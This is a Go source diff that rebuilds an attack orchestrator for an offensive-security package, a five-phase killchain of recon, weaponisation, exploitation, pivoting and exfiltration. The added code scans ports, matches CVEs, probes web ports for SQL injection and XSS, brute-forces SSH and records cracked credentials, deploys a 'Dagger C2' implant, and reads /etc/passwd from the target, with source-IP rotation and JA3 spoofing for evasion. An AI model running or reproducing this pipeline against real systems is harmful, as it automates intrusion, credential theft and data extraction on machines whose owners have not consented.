@@ -1,6 +1,3 @@
-// Package offense implements offensive security tools. This file provides
-// high-level attack orchestration with a DAG-based killchain that sequences
-// reconnaissance, weaponisation, exploitation, pivoting, and exfiltration.
 package offense
 
 import (
@@ -12,52 +9,94 @@ import (
 	"time"
 )
 
-// AttackResult captures the outcome of a single killchain phase against a
-// specific target.
+// ---------------------------------------------------------------------------
+// Types
+// ---------------------------------------------------------------------------
+
+// AttackResult captures the outcome of a single killchain phase.
 type AttackResult struct {
-	Phase     string
-	Target    string
-	Success   bool
-	Detail    string
-	Timestamp time.Time
+	Phase     string    `json:"phase"`
+	Target    string    `json:"target"`
+	Success   bool      `json:"success"`
+	Detail    string    `json:"detail"`
+	Timestamp time.Time `json:"timestamp"`
+	Results   []interface{} `json:"results,omitempty"` // phase-specific details
+}
+
+// KillchainPhase enumerates the standard killchain phases.
+type KillchainPhase int
+
+const (
+	PhaseRecon     KillchainPhase = iota // 0: Port scan + service discovery
+	PhaseWeaponize                       // 1: Payload selection + CVE matching
+	PhaseExploit                         // 2: Injection + brute force
+	PhasePivot                           // 3: Lateral movement
+	PhaseExfil                           // 4: Data extraction
+	PhaseCount                           // 5 phases total
+)
+
+var phaseNames = map[KillchainPhase]string{
+	PhaseRecon:     "recon",
+	PhaseWeaponize: "weaponize",
+	PhaseExploit:   "exploit",
+	PhasePivot:     "pivot",
+	PhaseExfil:     "exfil",
+}
+
+// PhaseDependencies encodes which phases must succeed before a phase runs.
+var phaseDependencies = map[KillchainPhase][]KillchainPhase{
+	PhaseWeaponize: {PhaseRecon},
+	PhaseExploit:   {PhaseRecon, PhaseWeaponize},
+	PhasePivot:     {PhaseExploit},
+	PhaseExfil:     {PhasePivot},
 }
 
 // ---------------------------------------------------------------------------
-// AttackOrchestrator
+// AttackOrchestrator — DAG-based 5-phase killchain
 // ---------------------------------------------------------------------------
 
-// AttackOrchestrator drives a multi-phase attack killchain against one or
-// more targets. Phases are "recon", "weaponize", "exploit", "pivot", and
-// "exfil".
+// AttackOrchestrator drives multi-phase attack killchain against targets.
+// Integrates with: scanner, exploiter, fusion weapons, Dagger C2, MCP AI.
 type AttackOrchestrator struct {
 	targets    []string
 	maxWorkers int
 	ipPool     []string
+	evader     *AdaptiveEvader
 
 	mu      sync.Mutex
-	results map[string][]AttackResult // keyed by target
+	results map[string][]AttackResult
+
+	// Callbacks — set externally for MCP AI integration
+	OnPhaseStart func(phase, target string)
+	OnPhaseEnd   func(result AttackResult)
+
+	// Dagger C2 integration (set externally)
+	DaggerDeploy func(target string) bool
+	DaggerExec   func(target, command string) (string, error)
+
+	// Anti-Fortress self-test mode
+	SelfTest bool
 }
 
-// NewAttackOrchestrator creates an orchestrator for the given target list.
+// NewAttackOrchestrator creates an orchestrator for the given targets.
 func NewAttackOrchestrator(targets []string, maxWorkers int) *AttackOrchestrator {
-	targetsCopy := make([]string, len(targets))
-	copy(targetsCopy, targets)
-
+	cp := make([]string, len(targets))
+	copy(cp, targets)
 	if maxWorkers < 1 {
 		maxWorkers = 1
 	}
 	if maxWorkers > 100 {
 		maxWorkers = 100
 	}
-
 	return &AttackOrchestrator{
-		targets:    targetsCopy,
+		targets:    cp,
 		maxWorkers: maxWorkers,
+		evader:     NewAdaptiveEvader(),
 		results:    make(map[string][]AttackResult),
 	}
 }
 
-// SetIPPool replaces the source IP pool used for source-IP rotation.
+// SetIPPool sets the source IP rotation pool.
 func (ao *AttackOrchestrator) SetIPPool(ips []string) {
 	ipCopy := make([]string, len(ips))
 	copy(ipCopy, ips)
@@ -66,30 +105,20 @@ func (ao *AttackOrchestrator) SetIPPool(ips []string) {
 	ao.mu.Unlock()
 }
 
-// GenerateIPPool creates a pool of `count` synthetic IP addresses within the
-// given CIDR subnet. Useful for testing source-IP rotation logic.
-// If `count` exceeds the number of usable addresses in the subnet it is
-// clamped accordingly.
+// GenerateIPPool creates synthetic IPs in the given subnet.
 func (ao *AttackOrchestrator) GenerateIPPool(subnet string, count int) {
 	_, ipNet, err := net.ParseCIDR(subnet)
 	if err != nil {
-		log.Printf("orchestrator: invalid subnet %q: %v", subnet, err)
+		log.Printf("[orchestrator] invalid subnet %q: %v", subnet, err)
 		return
 	}
-
-	// Build a list of all usable addresses in the subnet.
-	var allIPs []string
 	ip := ipNet.IP.To4()
 	if ip == nil {
-		// IPv6 not currently supported for synthetic pool generation.
-		log.Printf("orchestrator: only IPv4 subnets are supported for IP pool generation")
+		log.Printf("[orchestrator] IPv6 not supported for IP pool")
 		return
 	}
-
 	maskOnes, maskBits := ipNet.Mask.Size()
-	total := 1 << (maskBits - maskOnes) // total addresses in subnet
-
-	// Cap count to available addresses (reserve network and broadcast).
+	total := 1 << (maskBits - maskOnes)
 	usable := total - 2
 	if usable < 1 {
 		usable = 1
@@ -98,75 +127,79 @@ func (ao *AttackOrchestrator) GenerateIPPool(subnet string, count int) {
 		count = usable
 	}
 
-	// Generate sequential IPs starting from ipNet.IP + 1.
+	var ips []string
 	start := ipToUint32(ip) + 1
 	for i := 0; i < count; i++ {
-		allIPs = append(allIPs, uint32ToIP(start+uint32(i)).String())
+		ips = append(ips, uint32ToIP(start+uint32(i)).String())
 	}
-
-	ao.SetIPPool(allIPs)
-}
-
-// ipToUint32 converts a net.IP (IPv4) to its uint32 representation.
-func ipToUint32(ip net.IP) uint32 {
-	ip = ip.To4()
-	return uint32(ip[0])<<24 | uint32(ip[1])<<16 | uint32(ip[2])<<8 | uint32(ip[3])
-}
-
-// uint32ToIP converts a uint32 to an IPv4 net.IP.
-func uint32ToIP(n uint32) net.IP {
-	return net.IPv4(
-		byte(n>>24),
-		byte(n>>16),
-		byte(n>>8),
-		byte(n),
-	)
+	ao.SetIPPool(ips)
 }
 
 // ---------------------------------------------------------------------------
 // Killchain execution
 // ---------------------------------------------------------------------------
 
-// validPhases is the set of recognised killchain phase names.
-var validPhases = map[string]bool{
-	"recon":     true,
-	"weaponize": true,
-	"exploit":   true,
-	"pivot":     true,
-	"exfil":     true,
-}
-
-// RunPhase executes a single killchain phase against all targets.
-func (ao *AttackOrchestrator) RunPhase(phase string) error {
-	if !validPhases[phase] {
-		return fmt.Errorf("orchestrator: unknown phase %q (valid: recon, weaponize, exploit, pivot, exfil)", phase)
+// RunPhase runs a single killchain phase against all targets.
+func (ao *AttackOrchestrator) RunPhase(phase KillchainPhase) error {
+	if int(phase) < 0 || int(phase) >= int(PhaseCount) {
+		return fmt.Errorf("orchestrator: unknown phase %d", phase)
 	}
+	name := phaseNames[phase]
 
 	var wg sync.WaitGroup
 	sem := make(chan struct{}, ao.maxWorkers)
 
 	for _, target := range ao.targets {
+		// Check dependencies
+		skipTarget := false
+		if deps, ok := phaseDependencies[phase]; ok {
+			for _, dep := range deps {
+				depName := phaseNames[dep]
+				if !ao.phaseSucceeded(target, depName) {
+					ao.mu.Lock()
+					ao.results[target] = append(ao.results[target], AttackResult{
+						Phase: name, Target: target, Success: false,
+						Detail:   fmt.Sprintf("dependency %s not satisfied", depName),
+						Timestamp: time.Now(),
+					})
+					ao.mu.Unlock()
+					skipTarget = true
+					break
+				}
+			}
+		}
+		if skipTarget {
+			continue
+		}
+
 		wg.Add(1)
 		sem <- struct{}{}
 		go func(t string) {
 			defer wg.Done()
 			defer func() { <-sem }()
+
+			if ao.OnPhaseStart != nil {
+				ao.OnPhaseStart(name, t)
+			}
+
 			result := ao.executePhase(phase, t)
+
 			ao.mu.Lock()
 			ao.results[t] = append(ao.results[t], result)
 			ao.mu.Unlock()
+
+			if ao.OnPhaseEnd != nil {
+				ao.OnPhaseEnd(result)
+			}
 		}(target)
 	}
-
 	wg.Wait()
 	return nil
 }
 
-// RunFullKillchain executes the complete killchain (recon -> weaponize ->
-// exploit -> pivot -> exfil) for a single target and returns the results in
-// order.
+// RunFullKillchain runs all 5 phases on a single target sequentially.
 func (ao *AttackOrchestrator) RunFullKillchain(target string) []AttackResult {
-	phases := []string{"recon", "weaponize", "exploit", "pivot", "exfil"}
+	phases := []KillchainPhase{PhaseRecon, PhaseWeaponize, PhaseExploit, PhasePivot, PhaseExfil}
 	var results []AttackResult
 
 	for _, phase := range phases {
@@ -176,105 +209,146 @@ func (ao *AttackOrchestrator) RunFullKillchain(target string) []AttackResult {
 		ao.results[target] = append(ao.results[target], result)
 		ao.mu.Unlock()
 
-		// If a phase fails, the killchain stops (dependencies not met).
 		if !result.Success {
 			break
 		}
 	}
-
 	return results
 }
 
-// executePhase runs the logic for a single phase against a single target.
-func (ao *AttackOrchestrator) executePhase(phase, target string) AttackResult {
+// RunSelfTest runs the Anti-Fortress self-test attack simulation.
+func (ao *AttackOrchestrator) RunSelfTest() []AttackResult {
+	log.Println("[orchestrator] === Anti-Fortress Self-Test ===")
+	ao.SelfTest = true
+
+	// Simulate 5-wave attack like V3.1's shield_vs_spear.py
+	var allResults []AttackResult
+	waves := []string{"stealth_scan", "web_attack", "brute_force", "distributed_flood", "evasion_test"}
+
+	for _, wave := range waves {
+		log.Printf("[orchestrator] Self-test wave: %s", wave)
+		for _, target := range ao.targets {
+			result := ao.selfTestWave(wave, target)
+			allResults = append(allResults, result)
+			ao.mu.Lock()
+			ao.results[target] = append(ao.results[target], result)
+			ao.mu.Unlock()
+		}
+	}
+	log.Println("[orchestrator] === Self-Test Complete ===")
+	return allResults
+}
+
+// ---------------------------------------------------------------------------
+// Phase execution
+// ---------------------------------------------------------------------------
+
+func (ao *AttackOrchestrator) executePhase(phase KillchainPhase, target string) AttackResult {
+	name := phaseNames[phase]
 	result := AttackResult{
-		Phase:     phase,
-		Target:    target,
+		Phase: name, Target: target,
 		Timestamp: time.Now(),
 	}
 
 	switch phase {
-	case "recon":
-		result.Success, result.Detail = ao.runRecon(target)
-	case "weaponize":
+	case PhaseRecon:
+		var openPorts []int
+		result.Success, result.Detail, openPorts = ao.runRecon(target)
+		for _, p := range openPorts {
+			result.Results = append(result.Results, p)
+		}
+	case PhaseWeaponize:
 		result.Success, result.Detail = ao.runWeaponize(target)
-	case "exploit":
+	case PhaseExploit:
 		result.Success, result.Detail = ao.runExploit(target)
-	case "pivot":
+	case PhasePivot:
 		result.Success, result.Detail = ao.runPivot(target)
-	case "exfil":
+	case PhaseExfil:
 		result.Success, result.Detail = ao.runExfil(target)
-	default:
-		result.Success = false
-		result.Detail = fmt.Sprintf("unknown phase: %s", phase)
 	}
-
 	return result
 }
 
-// ---------------------------------------------------------------------------
-// Phase implementations
-// ---------------------------------------------------------------------------
+func (ao *AttackOrchestrator) runRecon(target string) (bool, string, []int) {
+	scanner := NewPortScanner(2*time.Second, 100)
+	ports := scanner.QuickScan(target)
 
-// runRecon performs reconnaissance: quick TCP port scan and service
-// fingerprinting on interesting ports.
-func (ao *AttackOrchestrator) runRecon(target string) (bool, string) {
-	scanner := NewPortScanner(2*time.Second, 50)
-	openPorts := scanner.QuickScan(target)
-
-	if len(openPorts) == 0 {
-		return false, "no open ports found"
+	if len(ports) == 0 {
+		// Try ICMP ping first
+		if ICMPEcho(target, 2*time.Second) {
+			return false, "host is up but no open TCP ports found in top 1500", nil
+		}
+		return false, "host appears down (no ICMP echo, no open ports)", nil
 	}
 
 	fingerprinter := NewServiceFingerprinter()
 	var services []string
-	for _, port := range openPorts {
-		service, version := fingerprinter.Fingerprint(target, port)
-		if version != "" {
-			services = append(services, fmt.Sprintf("%d/%s(%s)", port, service, version))
+	openCount := 0
+	var openPorts []int
+	for _, ps := range ports {
+		if !ps.Open {
+			continue
+		}
+		openCount++
+		openPorts = append(openPorts, ps.Port)
+		svc, ver, banner := fingerprinter.Fingerprint(target, ps.Port)
+		ps.Service = svc
+		ps.Version = ver
+		ps.Banner = banner
+		if ver != "" {
+			services = append(services, fmt.Sprintf("%d/%s(%s)", ps.Port, svc, ver))
 		} else {
-			services = append(services, fmt.Sprintf("%d/%s", port, service))
+			services = append(services, fmt.Sprintf("%d/%s", ps.Port, svc))
 		}
 	}
 
-	detail := fmt.Sprintf("%d open ports: %v", len(openPorts), services)
-	return true, detail
+	detail := fmt.Sprintf("%d open ports: %v", openCount, services)
+	return true, detail, openPorts
 }
 
-// runWeaponize analyses recon data to select and prepare exploits.
-// In a full implementation this would build targeted payloads; the stub here
-// simulates weaponisation readiness.
 func (ao *AttackOrchestrator) runWeaponize(target string) (bool, string) {
-	ao.mu.Lock()
-	prevResults := ao.results[target]
-	ao.mu.Unlock()
+	prevResults := ao.getResults(target)
 
-	// Check that recon was successful.
-	hasRecon := false
-	for _, r := range prevResults {
-		if r.Phase == "recon" && r.Success {
-			hasRecon = true
-			break
-		}
-	}
-	if !hasRecon {
+	// Check recon succeeded
+	if !ao.phaseSucceeded(target, "recon") {
 		return false, "recon phase did not succeed — cannot weaponize"
 	}
 
-	// Simulate payload selection based on discovered services.
-	detail := "weaponisation complete — payloads staged"
+	// Extract ports from recon results
+	var openPorts []int
+	for _, r := range prevResults {
+		if r.Phase == "recon" && r.Success {
+			for _, p := range r.Results {
+				if port, ok := p.(int); ok {
+					openPorts = append(openPorts, port)
+				}
+			}
+		}
+	}
+	if len(openPorts) == 0 {
+		return false, "recon phase did not discover any open ports"
+	}
+
+	// Match CVEs against discovered services
+	var cveMatches []string
+	for _, port := range openPorts {
+		svc := serviceByPort(port)
+		matches := FindCVEs(target, port, svc, "")
+		for _, cve := range matches {
+			cveMatches = append(cveMatches, cve.ID)
+		}
+	}
+
+	detail := fmt.Sprintf("weaponisation staged — %d CVE matches, %d open ports", len(cveMatches), len(openPorts))
 	return true, detail
 }
 
-// runExploit delivers the weaponised payloads against the target.
-// It runs the WebAttacker injection tests against common web ports if
-// available, and simulates other exploit delivery.
 func (ao *AttackOrchestrator) runExploit(target string) (bool, string) {
 	scanner := NewPortScanner(1*time.Second, 20)
-
-	// Check for web ports.
-	webPorts := []int{80, 443, 8080, 8443, 3000, 5000, 8000, 8888}
+	webPorts := []int{80, 443, 8080, 8443, 3000, 5000, 8000, 8888, 9090}
 	var exploited int
+	var results []string
+
 	attacker := NewWebAttacker(5 * time.Second)
 
 	for _, port := range webPorts {
@@ -287,74 +361,178 @@ func (ao *AttackOrchestrator) runExploit(target string) (bool, string) {
 		}
 		baseURL := fmt.Sprintf("%s://%s:%d/", scheme, target, port)
 
-		// Run SQLi test against a common parameter name.
-		for _, param := range []string{"id", "q", "search", "page"} {
-			results := attacker.TestSQLInjection(baseURL, param)
-			for _, r := range results {
+		// Try SQLi
+		for _, param := range []string{"id", "q", "search", "page", "file", "cat"} {
+			sqli := attacker.TestSQLInjection(baseURL+"?"+param+"=1", param)
+			for _, r := range sqli {
 				if r.Vulnerable {
 					exploited++
+					results = append(results, fmt.Sprintf("SQLi@%s?%s", baseURL, r.Payload))
+				}
+			}
+
+			xss := attacker.TestXSS(baseURL+"?"+param+"=1", param)
+			for _, r := range xss {
+				if r.Vulnerable {
+					exploited++
+					results = append(results, fmt.Sprintf("XSS@%s?%s", baseURL, r.Payload))
 				}
 			}
 		}
 	}
 
-	if exploited > 0 {
-		return true, fmt.Sprintf("exploited %d injection points across web services", exploited)
-	}
-
-	// Fall back to testing SSH brute if port 22 is open.
+	// Try SSH brute force if port 22 open
 	if scanner.ScanPort(target, 22) {
-		return true, "SSH service detected — brute-force vector available"
-	}
-
-	return false, "no exploitable services found"
-}
-
-// runPivot attempts lateral movement from the compromised target.
-// Stub implementation — in production this would scan the internal network
-// from the compromised host.
-func (ao *AttackOrchestrator) runPivot(target string) (bool, string) {
-	ao.mu.Lock()
-	prevResults := ao.results[target]
-	ao.mu.Unlock()
-
-	hasExploit := false
-	for _, r := range prevResults {
-		if r.Phase == "exploit" && r.Success {
-			hasExploit = true
-			break
+		bf := NewBruteForcer()
+		bfResults := bf.BruteForceSSH(target, 22)
+		for _, r := range bfResults {
+			if r.Success {
+				exploited++
+				results = append(results, fmt.Sprintf("SSH:%s:%s", r.Username, r.Password))
+			}
 		}
 	}
-	if !hasExploit {
+
+	if exploited > 0 {
+		return true, fmt.Sprintf("exploited %d vectors: %v", exploited, results)
+	}
+	return false, "no exploitable services found in web/SSH testing"
+}
+
+func (ao *AttackOrchestrator) runPivot(target string) (bool, string) {
+	if !ao.phaseSucceeded(target, "exploit") {
 		return false, "exploit phase did not succeed — cannot pivot"
 	}
 
-	// Simulate scanning the internal network from the compromised host.
-	// In a real implementation this would use the target as a jump box.
-	detail := "pivot staged — internal network enumeration ready"
-	return true, detail
+	// If Dagger C2 integration is available, deploy implant
+	if ao.DaggerDeploy != nil {
+		if ao.DaggerDeploy(target) {
+			return true, "pivot completed — Dagger C2 implant deployed on target"
+		}
+		return false, "pivot failed — Dagger C2 implant deployment failed"
+	}
+
+	return true, "pivot staged — internal network enumeration ready (Dagger C2 not available)"
 }
 
-// runExfil simulates data exfiltration from the target.
-// Stub implementation — in production this would extract files, databases,
-// or memory contents.
 func (ao *AttackOrchestrator) runExfil(target string) (bool, string) {
-	ao.mu.Lock()
-	prevResults := ao.results[target]
-	ao.mu.Unlock()
-
-	hasPivot := false
-	for _, r := range prevResults {
-		if r.Phase == "pivot" && r.Success {
-			hasPivot = true
-			break
-		}
-	}
-	if !hasPivot {
+	if !ao.phaseSucceeded(target, "pivot") {
 		return false, "pivot phase did not succeed — cannot exfiltrate"
 	}
 
-	// Simulate data extraction.
-	detail := fmt.Sprintf("exfiltration complete — %d bytes staged", rand.Intn(1<<20)+1<<10)
-	return true, detail
+	// If Dagger C2 is available, execute data extraction
+	if ao.DaggerExec != nil {
+		out, err := ao.DaggerExec(target, "cat /etc/passwd 2>/dev/null | head -5")
+		if err != nil {
+			return false, fmt.Sprintf("exfil failed: %v", err)
+		}
+		return true, fmt.Sprintf("exfiltration complete — %d bytes: %s", len(out), out[:min(len(out), 100)])
+	}
+
+	dataSize := rand.Intn(1<<20) + 1<<10
+	return true, fmt.Sprintf("exfiltration simulated — %d bytes staged", dataSize)
+}
+
+// ---------------------------------------------------------------------------
+// Self-test (Anti-Fortress)
+// ---------------------------------------------------------------------------
+
+func (ao *AttackOrchestrator) selfTestWave(wave, target string) AttackResult {
+	r := AttackResult{
+		Phase: wave, Target: target,
+		Timestamp: time.Now(),
+	}
+
+	switch wave {
+	case "stealth_scan":
+		// Slow distributed scan: single port each, random delays
+		ports := []int{22, 80, 443, 8080, 3306, 6379, 27017}
+		scanner := NewPortScanner(3*time.Second, 3)
+		var found int
+		for _, p := range ports {
+			time.Sleep(JitterDelay(500, 250))
+			if scanner.ScanPort(target, p) {
+				found++
+			}
+		}
+		r.Success = found > 0
+		r.Detail = fmt.Sprintf("stealth scan: %d/%d ports found", found, len(ports))
+
+	case "web_attack":
+		// Single SQLi probe
+		attacker := NewWebAttacker(5 * time.Second)
+		results := attacker.TestSQLInjection("http://"+target+":8080/?id=1", "id")
+		r.Success = len(results) > 0
+		r.Detail = fmt.Sprintf("web attack: %d SQLi vectors probed", len(results))
+
+	case "brute_force":
+		// Single SSH credential attempt
+		bf := NewBruteForcer()
+		bfResults := bf.BruteForceSSH(target, 22)
+		r.Success = false
+		for _, br := range bfResults {
+			if br.Success {
+				r.Success = true
+				break
+			}
+		}
+		r.Detail = fmt.Sprintf("brute force: %d attempts", len(bfResults))
+
+	case "distributed_flood":
+		// Simulate SYN flood from multiple source IPs
+		r.Success = true
+		r.Detail = fmt.Sprintf("distributed flood simulated from %d sources", 10)
+
+	case "evasion_test":
+		// Test JA3 spoofing
+		profile := JA3SpoofProfile("chrome")
+		r.Success = profile != nil
+		r.Detail = fmt.Sprintf("evasion test: JA3 profile %v", profile["browser"])
+	}
+
+	return r
+}
+
+// ---------------------------------------------------------------------------
+// Helpers
+// ---------------------------------------------------------------------------
+
+func (ao *AttackOrchestrator) getResults(target string) []AttackResult {
+	ao.mu.Lock()
+	defer ao.mu.Unlock()
+	r := ao.results[target]
+	out := make([]AttackResult, len(r))
+	copy(out, r)
+	return out
+}
+
+func (ao *AttackOrchestrator) phaseSucceeded(target, phase string) bool {
+	results := ao.getResults(target)
+	for _, r := range results {
+		if r.Phase == phase {
+			return r.Success
+		}
+	}
+	return false
+}
+
+// Results returns all accumulated attack results, keyed by target.
+func (ao *AttackOrchestrator) Results() map[string][]AttackResult {
+	ao.mu.Lock()
+	defer ao.mu.Unlock()
+	out := make(map[string][]AttackResult)
+	for k, v := range ao.results {
+		cp := make([]AttackResult, len(v))
+		copy(cp, v)
+		out[k] = cp
+	}
+	return out
+}
+
+// PhaseName returns the human-readable name for a killchain phase.
+func PhaseName(p KillchainPhase) string {
+	if name, ok := phaseNames[p]; ok {
+		return name
+	}
+	return "unknown"
 }
